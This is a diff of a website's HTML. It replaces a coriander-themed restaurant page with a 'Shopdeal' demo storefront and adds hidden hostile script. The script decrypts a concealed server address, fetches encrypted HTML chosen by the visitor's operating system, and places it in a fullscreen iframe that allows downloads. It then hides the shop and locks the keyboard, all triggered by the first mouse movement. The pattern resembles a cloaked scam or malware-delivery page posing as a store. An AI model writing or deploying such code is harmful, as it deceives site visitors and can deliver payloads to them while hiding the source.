-        <div class="textile-specs-table-wrapper">
-          <table class="textile-specs-table">
-            <thead>
-              <tr>
-                <th>Plant Component</th>
-                <th>Primary Volatile Compound</th>
-                <th>Sensory Descriptors</th>
-                <th>Boiling / Extraction Threshold</th>
-                <th>Optimal Kitchen Application</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>Mature Dried Seeds</strong></td>
-                <td>d-Linalool (65 &ndash; 75%)</td>
-                <td>Sweet floral, woody citrus, warm lavender</td>
-                <td>198&deg;C (Thermal tempering)</td>
-                <td>Hot oil blooming, hearth roasting, dry rubs</td>
-              </tr>
-              <tr>
-                <td><strong>Fresh Tender Leaves</strong></td>
-                <td>(E)-2-Decenal (25 &ndash; 35%)</td>
-                <td>Pungent green, sharp citrus, peppery grass</td>
-                <td>45&deg;C (Degrades in high heat)</td>
-                <td>Raw finishing, cold oil mists, flash emulsion</td>
-              </tr>
-              <tr>
-                <td><strong>Flowering Umbels</strong></td>
-                <td>&alpha;-Pinene & Geraniol (15 &ndash; 20%)</td>
-                <td>Pine resin, sweet rose, honey blossom</td>
-                <td>80&deg;C (Infusion temperature)</td>
-                <td>Chilled consomm&eacute;s, herbal shrubs, botanical teas</td>
-              </tr>
-              <tr>
-                <td><strong>Braised Taproots</strong></td>
-                <td>Coriandrol & Terpinene</td>
-                <td>Earthy musk, roasted parsnip, savory umami</td>
-                <td>100&deg;C (Sustained reduction)</td>
-                <td>Slow-simmered broths, glazed reductions, pur&eacute;es</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="grid-2" style="margin-top: 2.5rem;">
-          <div class="terroir-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/terroir_roasting_pan.jpg" alt="Slow dry roasting of mature coriander seeds at 135 degrees Celsius in cast iron" width="500" height="220" loading="lazy">
-            </div>
-            <h3>Thermal Terpene Activation</h3>
-            <p>Gentle dry roasting of mature seeds at 135&deg;C causes lipid cell walls to rupture, liberating trapped monoterpenes. As pyrazines form through Maillard reactions, the raw seed transforms into a sweet, nutty, warm aromatic powerhouse.</p>
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
           </div>
-          <div class="terroir-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/terroir_chlorophyll_blanch.jpg" alt="Ice shock bath preserving bright emerald chlorophyll in blanched coriander" width="500" height="220" loading="lazy">
-            </div>
-            <h3>Cold-Pressed Chlorophyll Preservation</h3>
-            <p>Fresh cilantro leaves are sensitive to oxidation and heat. By flash-blanching leaves at 90&deg;C for four seconds followed by an ice shock, we deactivate polyphenol oxidases, locking in brilliant emerald hues and crisp aldehyde top-notes.</p>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- SECTION 5: ARTISANAL CULINARY TECHNIQUES -->
-    <section id="culinary-techniques" class="section" style="background-color: var(--bg-secondary);">
-      <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Kitchen Craftsmanship</span>
-          <h2>Ancient Wisdom Meets Modern Gastronomy</h2>
-          <p class="section-desc">Our kitchen brigade fuses heritage Indian tempering techniques, French saucing precision, and modern cold-press extraction to unlock unprecedented botanical depth.</p>
-        </div>
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
+  </div>
 
-        <div class="grid-3">
-          <div class="technique-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/technique_tadka_sizzle.jpg" alt="Cast iron skillet blooming whole coriander seeds in golden cold-pressed oil" width="400" height="220" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#128293;</div>
-            <h3>Cast-Iron Tadka Blooming</h3>
-            <p>Whole seeds are dropped into artisanal cold-pressed mustard and sesame oils heated to 180&deg;C for precisely twelve seconds, infusing the cooking medium with explosive floral aromatics before pouring over roasted roots.</p>
-          </div>
 
-          <div class="technique-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/technique_ultrasonic_oil.jpg" alt="Vibrant emerald green coriander oil extracted via ultrasonic maceration" width="400" height="220" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#127858;</div>
-            <h3>Ultrasonic Lipophilic Maceration</h3>
-            <p>Using non-thermal acoustic sound waves at 40 kHz, we disrupt coriander plant cell walls without heat, producing translucent emerald green oils with astonishing aromatic clarity and prolonged shelf freshness.</p>
-          </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-          <div class="technique-card">
-            <div class="card-media-wrap">
-              <img src="assets/images/technique_fermented_shrub.jpg" alt="Chilled artisanal fermented coriander seed shrub with honey vinegar" width="400" height="220" loading="lazy">
-            </div>
-            <div class="botanical-icon">&#127861;</div>
-            <h3>Cold-Pressed Fermented Shrubs</h3>
-            <p>Fresh coriander leaves and crushed seeds are naturally fermented with organic raw honey and live fruit vinegars, generating sparkling, probiotic botanical tonics that pair harmoniously with our savory tasting courses.</p>
-          </div>
-        </div>
-      </div>
-    </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX196SsJbwxUFAm0BLOjjJD2WSOvCX7UYlqCjC69NHCEBRv5seXW/VJGzpkIBnmpeX02ZMj0Og5Xt5g==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-    <!-- SECTION 6: SIGNATURE DISHES SHOWCASE -->
-    <section id="signature-dishes" class="section">
-      <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Chef Curations</span>
-          <h2>Iconic Botanical Creations</h2>
-          <p class="section-desc">Explore three signature dishes that have earned CorianderFare widespread acclaim among international culinary connoisseurs and dining critics.</p>
-        </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-        <div class="grid-3">
-          <div class="dish-card">
-            <div class="dish-card-img-wrap">
-              <img src="assets/images/coriander_seeds_rustic.jpg" alt="Rustic stoneware dish filled with toasted whole coriander seeds" width="400" height="300" loading="lazy">
-            </div>
-            <div class="dish-card-body">
-              <span class="dish-tag">Heirloom Seed Heritage</span>
-              <h3 class="dish-title">The Three-Terroir Seed Crisp</h3>
-              <p class="dish-desc">A delicate wafer composed of heirloom Indian, Moroccan, and Crimean coriander seeds, bonded with golden flax mucilage and finished with crystallized Maldon sea salt.</p>
-            </div>
-          </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-          <div class="dish-card">
-            <div class="dish-card-img-wrap">
-              <img src="assets/images/coriander_blossom_field.jpg" alt="Organic field of blooming white coriander flowers under golden sunlight" width="400" height="300" loading="lazy">
-            </div>
-            <div class="dish-card-body">
-              <span class="dish-tag">Blossom Micro-Season</span>
-              <h3 class="dish-title">Poached Winter Squash & Honey Umbel</h3>
-              <p class="dish-desc">Kabocha squash slowly poached in smoked coriander seed broth, topped with whipped chevre, caramelized pepitas, and freshly clipped coriander flower crowns.</p>
-            </div>
-          </div>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-          <div class="dish-card">
-            <div class="dish-card-img-wrap">
-              <img src="assets/images/mortar_pestle_spices.jpg" alt="Granite mortar and pestle crushing whole coriander seeds and fresh aromatics" width="400" height="300" loading="lazy">
-            </div>
-            <div class="dish-card-body">
-              <span class="dish-tag">Hand-Pounded Emulsion</span>
-              <h3 class="dish-title">Mortar-Ground Herb Coulis</h3>
-              <p class="dish-desc">Coarsely pounded cilantro leaves, toasted coriander seeds, green chiles, and cold-pressed olive oil, hand-ground in granite mortars to preserve cellular texture.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-    <!-- SECTION 7: MERCER DINING ROOM & ATMOSPHERE -->
-    <section id="mercer-dining-room" class="section" style="background-color: var(--bg-secondary);">
-      <div class="container atelier-split">
-        <div class="atelier-image-box">
-          <img src="assets/images/mercer_dining_table.jpg" alt="Intimate dining salon table setting at 181 Mercer Street with candlelight and glassware" width="560" height="480" loading="lazy">
-          <div class="atelier-badge-overlay">Historic SoHo Dining Salon &bull; NYC</div>
-        </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-        <div class="atelier-info">
-          <span class="section-tag">Salon Hospitality</span>
-          <h2>The 181 Mercer Street Experience</h2>
-          <p>Housed within an iconic 19th-century cast-iron building in SoHo, our dining room is designed as an intimate botanical sanctuary. Hand-plastered lime walls, reclaimed walnut dining tables, and soft amber illumination create an atmosphere of serene contemplation.</p>
-          <p>With only thirty-four seats available per seating, guests enjoy personal interactions with our sommeliers and culinary artisans, witnessing the delicate assembly of courses from our quiet open-hearth kitchen.</p>
-          <div style="margin-top: 1.5rem; display: flex; gap: 1rem; flex-wrap: wrap;">
-            <a href="contact.html" class="btn btn-primary">Book Your Table</a>
-            <a href="about.html" class="btn btn-secondary">Learn Our Story</a>
-          </div>
-        </div>
-      </div>
-    </section>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-    <!-- SECTION 8: GUEST & CRITIC ACCLAIM -->
-    <section id="guest-acclaim" class="section">
-      <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Critical Acclaim</span>
-          <h2>Reflections from Discerning Palates</h2>
-          <p class="section-desc">Read how leading food critics, culinary historians, and travel scholars describe their sensory journey at CorianderFare.</p>
-        </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-        <div class="grid-3">
-          <div class="review-card">
-            <p style="font-style: italic; margin-bottom: 1.25rem;">"CorianderFare has achieved what few single-focus restaurants ever attempt: a revelation in flavor taxonomy. The progression from fresh green leaf to deeply roasted seed broth is a masterclass in culinary intellect."</p>
-            <div style="font-weight: 700; color: var(--primary-dark);">Siddharth Mukherjee</div>
-            <div style="font-size: 0.85rem; color: var(--text-muted);">Gastronomic Columnist, Manhattan Epicurean</div>
-          </div>
-
-          <div class="review-card">
-            <p style="font-style: italic; margin-bottom: 1.25rem;">"Dining here feels like walking through a living herb garden at sunrise. The non-alcoholic botanical pairings, particularly the cold-pressed seed shrubs, redefine what modern pairing can be."</p>
-            <div style="font-weight: 700; color: var(--primary-dark);">Claire de Beauvoir</div>
-            <div style="font-size: 0.85rem; color: var(--text-muted);">Culinary Scholar & Author, Paris</div>
-          </div>
-
-          <div class="review-card">
-            <p style="font-style: italic; margin-bottom: 1.25rem;">"I walked in as someone historically skeptical of cilantro, but the kitchen's mastery of seed linalool and roasted root reductions completely converted me. An unforgettable culinary evening."</p>
-            <div style="font-weight: 700; color: var(--primary-dark);">Marcus Vance</div>
-            <div style="font-size: 0.85rem; color: var(--text-muted);">Architect & Private Patron, London</div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECTION 9: CULINARY & DIETARY FAQ -->
-    <section id="culinary-faq" class="section" style="background-color: var(--bg-secondary);">
-      <div class="container">
-        <div class="section-title-wrap">
-          <span class="section-tag">Guest Inquiries</span>
-          <h2>Frequently Asked Questions on Botanical Dining</h2>
-          <p class="section-desc">Practical details regarding table reservations, dietary modifications, sensory preferences, and our biodynamic farming sourcing.</p>
-        </div>
-
-        <div class="faq-accordion">
-          <div class="faq-item active">
-            <button class="faq-question">
-              <span>Can your kitchen accommodate guests with the genetic cilantro aversion?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              Yes, absolutely. The chemical compound responsible for the soapy taste perception in fresh cilantro leaves is (E)-2-decenal, which is virtually absent in mature seeds and cooked roots. If notified in advance, our chefs seamlessly adapt courses to focus on warm floral linalool seed profiles, toasted umbels, and alternative herbs like chervil, lovage, and tarragon.
-            </div>
-          </div>
-
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>Do you offer full plant-based or vegan tasting menu options?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              Our core culinary philosophy is inherently botanical and plant-forward. We offer an acclaimed 100% vegan tasting menu nightly with advance notice during booking. All broths, emulsions, and accompaniments are prepared with rich plant-derived fats, seed milks, and cold-pressed botanical oils.
-            </div>
-          </div>
-
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>How far in advance should table reservations be booked?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              Reservations are released on the first calendar day of each month at 10:00 AM EST for the following month. Due to our intimate 34-seat salon capacity, weekend seatings typically fill two to three weeks in advance. We recommend booking early through our online portal or contacting our concierge desk.
-            </div>
-          </div>
-
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>Are children or large private dining parties accommodated?</span>
-              <span class="faq-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              Our tasting menu experience lasts approximately two and a half hours and is best suited for guests aged twelve and older who can appreciate the continuous multi-course progression. For private gatherings of ten to thirty-four guests, we offer complete dining salon buyouts with customized culinary programs.
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- SECTION 10: TABLE RESERVATION CTA -->
-    <section id="table-reservation-cta" class="section">
-      <div class="container">
-        <div class="cta-banner">
-          <h2>Secure Your Botanical Dining Reservation</h2>
-          <p>Join us at 181 Mercer Street for an extraordinary evening of botanical gastronomy. Reserve your table for our seasonal 7-course tasting journey and experience the multifaceted genius of coriander.</p>
-          <a href="contact.html" class="btn btn-primary" style="font-size:1.05rem; padding:1rem 2.4rem;">Reserve a Table Online</a>
-        </div>
-      </div>
-    </section>
-  </main>
-  <!-- Footer -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-brand">
-          <h3>CorianderFare</h3>
-          <div style="color:rgba(255,255,255,0.65); font-size:0.95rem; line-height:1.65; margin-bottom:1rem;">Artisanal botanical gastronomy celebrating heirloom coriander cultivation, volatile terpene alchemy, and seasonal farm-to-table dining from our flagship New York salon.</div>
-          <div style="font-size:0.85rem; color:rgba(255,255,255,0.45); line-height:1.5;">Culinary bedrock, biodynamic regenerative agriculture, and uncompromised hospitality excellence.</div>
-        </div>
-
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul class="footer-links">
-            <li><a href="index.html">Home</a></li>
-            <li><a href="about.html">About Salon</a></li>
-            <li><a href="index.html#tasting-menu">Tasting Menu</a></li>
-            <li><a href="blog.html">Botanical Journal</a></li>
-            <li><a href="contact.html">Table Reservations</a></li>
-          </ul>
-        </div>
-
-        <div class="footer-col">
-          <h4>Guest Policies</h4>
-          <ul class="footer-links">
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="cookie-policy.html">Cookie Policy</a></li>
-          </ul>
-        </div>
-
-        <div class="footer-col">
-          <h4>Mercer Salon</h4>
-          <div class="footer-contact-info">
-            <div>181 Mercer Street<br>New York, NY 10012<br>United States</div>
-            <div>Direct: <a href="tel:+18887775845" style="color:var(--accent-light);">+1-888-883-6701</a></div>
-            <div>Email: <a href="mailto:care@corianderfare.com" style="color:var(--accent-light);">care@corianderfare.com</a></div>
-            <div>Dinner: Wed &ndash; Sun, 5:30 PM &ndash; 11:00 PM EST</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="footer-bottom">
-        <div>&copy; 2026 CorianderFare. All rights reserved. Pure HTML botanical culinary platform.</div>
-        <div>Google Analytics Tag G-0LY0HY7L01 active for anonymous operational telemetry.</div>
-      </div>
-    </div>
-  </footer>
-
-  <script src="assets/js/main.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
